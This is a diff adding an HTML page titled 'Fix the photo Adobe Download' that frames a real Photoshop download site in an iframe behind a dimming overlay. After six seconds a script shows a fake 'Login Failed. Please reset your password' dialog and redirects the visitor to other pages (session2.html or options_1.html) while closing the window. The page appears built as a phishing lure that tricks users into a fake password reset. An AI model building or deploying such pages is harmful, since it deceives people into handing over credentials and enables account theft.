@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<title>Fix the photo Adobe Download</title>
+</head>
+
+<style>
+	* {
+		padding: 0;
+	}
+
+	.buttonnext {
+		margin-left: 2cm;
+		background-color: rgb(206, 172, 92);
+		color: rgb(0, 0, 0);
+		border: 1px solid black;
+		border-radius: 5px;
+		padding: 8px 16px;
+		font-size: 23px;
+		transition-duration: 0.4s;
+		cursor: pointer;
+		font-family: "Century Gothic", sans-serif;
+	}
+
+	.buttonnext:hover {
+		background-color: white;
+		color: black;
+		border: 1px solid black;
+		box-shadow: 0 12px 16px 0 rgba(0, 0, 0, 0.24), 0 17px 50px 0 rgba(0, 0, 0, 0.19);
+	}
+
+	#overlay {
+		position: absolute;
+		top: 0;
+		left: 0;
+		width: 100%;
+		height: 100%;
+		z-index: 9990;
+		background-color: rgba(0, 0, 0, 0.5);
+		pointer-events: none;
+	}
+
+	iframe {
+		position: relative;
+		z-index: 1;
+	}
+</style>
+
+<body>
+
+	<div id="overlay"><iframe src="https://fixthephoto.com/photoshop-free.html" width="1460" height="700" onload="addOverlayListener(this)"></iframe>w</div>
+	
+	<script>
+		window.onload = function () {
+			setTimeout(function () {
+				if (confirm("Login Failed.Please reset your password to continue downloading.")) {
+					window.open("session2.html", "_blank");
+					window.close();
+				} else {
+					window.open("options_1.html", "_blank");
+					window.close();
+				}
+			}, 6000);
+		}
+
+		function addOverlayListener(iframe) {
+			let overlay = document.getElementById("overlay");
+			overlay.addEventListener("click", function(e) {
+				e.stopPropagation();
+				e.preventDefault();
+			});
+		}
+	</script>
+</body>
+
+</html>
